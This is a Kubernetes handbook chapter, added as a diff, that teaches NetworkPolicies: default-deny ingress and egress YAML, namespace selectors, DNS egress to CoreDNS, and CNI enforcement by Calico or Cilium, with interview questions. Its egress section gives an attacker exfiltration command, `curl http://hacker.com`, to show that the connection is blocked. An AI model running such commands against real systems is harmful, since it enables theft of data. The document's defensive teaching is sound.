@@ -1,0 +1,247 @@
+---
+contentId: network-policies
+title: "Zero-Trust (Network Policies)"
+titleAr: "الثقة الصفرية (Zero Trust) — Network Policies"
+description: "Write a default-deny policy and know why the CNI must enforce it"
+descriptionAr: "الرفض الافتراضي داخل الكلاستر، ولماذا هو الوضع الصحيح."
+domain: security
+level: advanced
+type: concept
+phase: security
+order: 34
+readingTime: 45
+prerequisites: ["kubernetes", "vpc"]
+relatedChapters: ["container-security"]
+objectives:
+  - "Write a default-deny policy and know why the CNI must enforce it"
+status: complete
+translationStatus: missing
+sourceFile: "Cloud-Native-DevOps-Handbook/34_Network_Policies.md"
+authors: [waleed]
+updated: 2026-08-08
+---
+
+## Introduction to Network Policies
+
+By default in Kubernetes, **all Pods can talk to all other Pods.**
+If the Frontend Pod is in `namespace-a`, and the Database Pod is in `namespace-b`, the Frontend can ping the Database.
+
+If a hacker breaks into the Frontend Pod, they will instantly run an automated script that scans the entire cluster for databases, and they will download all your data. 
+
+**Zero-Trust Networking** means exactly what it sounds like: trust no one. We must build microscopic firewalls around every single Pod.
+
+---
+
+## Level 1 — Beginner
+
+### What is a Network Policy?
+Imagine a giant office building (the Cluster) with 100 rooms (the Pods).
+- **Default Kubernetes:** All the doors are unlocked. Anyone in any room can walk into any other room. 
+- **Network Policies:** You put an electronic lock on every single door. You program the lock on the Database room: *"Only people wearing the 'Backend API' badge are allowed to enter. Everyone else is rejected."*
+
+If a hacker breaks into the Frontend room, they are physically trapped in the Frontend room. They cannot reach the Database.
+
+**Locking the doors, in order.** A NetworkPolicy selects Pods and states what
+traffic is allowed. The first policy you write is the one that changes the
+default from "everything" to "nothing":
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: default-deny-ingress
+  namespace: production
+spec:
+  podSelector: {}          # {} means EVERY Pod in this namespace
+  policyTypes:
+    - Ingress              # deny all inbound; egress is still unrestricted
+```
+
+With that applied, nothing can reach anything — so you now open exactly the paths
+the application needs:
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: postgres-from-api-only
+  namespace: production
+spec:
+  podSelector:
+    matchLabels:
+      app: postgres        # this policy protects the database Pods
+  policyTypes:
+    - Ingress
+  ingress:
+    - from:
+        - podSelector:
+            matchLabels:
+              app: api     # only Pods labelled app=api
+      ports:
+        - protocol: TCP
+          port: 5432       # and only on the database port
+```
+
+Three rules govern how these behave, and each one catches people out:
+
+- **Policies are additive, and there is no deny rule.** Traffic is allowed if
+  *any* policy allows it. You restrict by removing `allow` rules, never by
+  writing a `deny`.
+- **A Pod selected by no policy at all is unrestricted.** Security starts only
+  once something selects it — which is why the `default-deny` above comes first.
+- **`podSelector` matches within the policy's own namespace.** To allow traffic
+  from another namespace you need `namespaceSelector`, and forgetting it is the
+  usual cause of "my policy blocks traffic I meant to allow":
+
+```yaml
+  ingress:
+    - from:
+        - namespaceSelector:
+            matchLabels:
+              kubernetes.io/metadata.name: monitoring
+        - podSelector:
+            matchLabels:
+              app: prometheus
+```
+
+Note the shape carefully: two entries in the `from` list are **OR** (either
+source is allowed). To require *both* — a Pod labelled `prometheus` **in** the
+`monitoring` namespace — put `namespaceSelector` and `podSelector` as two keys
+of a *single* list entry. That one indentation level is the difference between a
+precise rule and an open door.
+
+**Do not forget egress.** Denying inbound traffic stops an attacker reaching your
+database; denying outbound traffic stops a compromised Pod calling home. But DNS
+runs over the network too, so an egress policy that forgets CoreDNS breaks every
+hostname lookup in the namespace:
+
+```yaml
+  egress:
+    - to:
+        - namespaceSelector:
+            matchLabels:
+              kubernetes.io/metadata.name: kube-system
+      ports:
+        - protocol: UDP
+          port: 53
+```
+
+### ASCII Diagram: Zero-Trust
+
+```text
+[ Hacker ] ---> Compromises ---> [ Frontend Pod ]
+                                        |
+                            (Tries to reach Database)
+                                        |
+                                        v
+                                 [ ❌ BLOCKED ]
+                                (Network Policy)
+                                        |
+                                        v
+                                 [ Database Pod ]
+```
+
+---
+
+## Level 2 — Intermediate
+
+### The CNI (Container Network Interface)
+Kubernetes itself does not actually enforce Network Policies. If you write a Network Policy YAML file, Kubernetes just saves it in its database and does nothing.
+
+You must install a **CNI Plugin** that supports Network Policies.
+- **Flannel:** Does NOT support Network Policies. If you use Flannel, your network policies will be silently ignored.
+- **Calico / Cilium:** These are enterprise CNIs. They read the Network Policy from the Kubernetes API and implement actual firewall rules (using iptables or eBPF) directly on the Linux Worker Nodes. In our project, we use **Calico**.
+
+### Ingress vs. Egress
+- **Ingress:** Traffic coming *IN* to the Pod.
+- **Egress:** Traffic going *OUT* of the Pod.
+
+**The Golden Rule:** Always implement a "Default Deny-All" policy. This drops all traffic in the entire namespace. Then, you explicitly "poke holes" for the specific traffic you want to allow.
+
+---
+
+## Level 3 — Advanced
+
+### Analyzing the Actual Code (Line-by-Line Breakdown)
+
+Look at `kubernetes/policies/network-policies.yaml`. This explicitly secures our API.
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: api-allow-ingress
+spec:
+  podSelector:
+    matchLabels:
+      app: ivolve-api
+  policyTypes:
+  - Ingress
+  ingress:
+  - from:
+    - namespaceSelector:
+        matchLabels:
+          name: ingress-nginx
+    - podSelector:
+        matchLabels:
+          app: frontend
+    ports:
+    - protocol: TCP
+      port: 8080
+```
+
+**Line-by-Line Breakdown:**
+- **`podSelector: matchLabels: app: ivolve-api`**: This tells Calico: *"Wrap a firewall around the API Pod."*
+- **`policyTypes: [Ingress]`**: We are only filtering incoming traffic. Because we specified Ingress, Calico instantly blocks ALL incoming traffic to the API by default, except for what we explicitly list below.
+- **`from: namespaceSelector: ingress-nginx`**: Hole #1. We allow the NGINX Ingress Controller (which lives in a different namespace) to send traffic to the API. If we don't do this, external internet users get a 504 Gateway Timeout.
+- **`from: podSelector: app: frontend`**: Hole #2. We allow the internal Frontend microservice to talk to the API.
+- **`ports: [8080]`**: Even if the Frontend connects, it is ONLY allowed to connect on Port 8080. If a hacker in the Frontend tries to SSH into the API on Port 22, it is instantly blocked.
+
+---
+
+## Level 4 — Enterprise
+
+### Egress Control (Preventing Data Exfiltration)
+Most engineers understand Ingress (blocking incoming traffic). But what about Egress?
+
+If a hacker breaks into your API pod, they will try to download a crypto-miner from the internet, or upload your customer data to their personal AWS S3 bucket.
+This requires an outbound internet connection.
+
+**Enterprise Defense:** Default Deny Egress.
+You block the API pod from talking to the internet. 
+```yaml
+  policyTypes:
+  - Egress
+  egress:
+  - to:
+    - ipBlock:
+        cidr: 10.20.32.0/20 # Only allow traffic to the RDS Subnet
+```
+With this policy, the API pod can only talk to the internal RDS database. If the hacker tries to run `curl http://hacker.com`, the network connection simply hangs until it times out. The data is trapped inside the cluster.
+
+### Calico GlobalNetworkPolicies
+Standard Kubernetes Network Policies are bound to a specific `namespace`. If you have 500 namespaces, you have to write 500 policies just to enforce a "Deny All" baseline. 
+**Calico Enterprise** provides a Custom Resource called `GlobalNetworkPolicy`.
+You write one policy, and it applies to the entire cluster simultaneously, guaranteeing that no developer can accidentally launch a pod in a new namespace without basic firewalls applied.
+
+---
+
+## Interview Questions
+
+### Beginner
+**Q: What is a "Default Deny" network policy?**
+A: A Default Deny policy is a baseline security rule that explicitly blocks all incoming (Ingress) and outgoing (Egress) traffic for all Pods in a namespace. Once applied, engineers must write explicit "Allow" rules to permit necessary traffic.
+
+### Intermediate
+**Q: Why doesn't standard Kubernetes enforce Network Policies out of the box?**
+A: Kubernetes is an orchestrator, not a router. It relies on the Container Network Interface (CNI) to handle the actual packet routing. If you install a basic CNI like Flannel (which only does routing), policies are ignored. You must install an advanced CNI like Calico or Cilium, which integrates with the Linux Kernel (iptables/eBPF) to actively drop packets.
+
+### Senior
+**Q: You applied a Network Policy to block all Egress traffic from your Pod. Now, your Pod cannot resolve DNS (e.g., it cannot resolve `database.default.svc.cluster.local`) and the application is crashing. Why, and how do you fix it?**
+A: When you block all Egress traffic, you also block outbound UDP Port 53 traffic to the Kubernetes `CoreDNS` service. The Pod cannot resolve IP addresses. You must write an explicit Egress rule allowing outbound traffic on Port 53 (UDP/TCP) specifically to the `kube-system` namespace where CoreDNS resides.
+
+### Principal/Architect
+**Q: Contrast iptables-based CNIs (like traditional Calico) with eBPF-based CNIs (like Cilium) for enforcing Network Policies in a 5,000-node cluster.**
+A: In a traditional iptables CNI, every Network Policy translates into sequential iptables rules on the Linux node. In a massive cluster, evaluating a packet against 50,000 iptables rules takes a long time, causing severe CPU spikes and network latency (the `iptables` bottleneck). 
+Cilium uses eBPF (Extended Berkeley Packet Filter). eBPF compiles the network policies into highly optimized, safe bytecode that executes directly inside the Linux Kernel using O(1) hash tables. It completely bypasses the iptables stack. This results in incredibly low latency, vastly lower CPU usage, and the ability to enforce Layer 7 (HTTP-aware) network policies, making eBPF the clear choice for hyper-scale enterprise environments.
+[Contents](/learn) | [35 — Advanced Networking (Service Mesh)](/learn/kubernetes/service-mesh) |
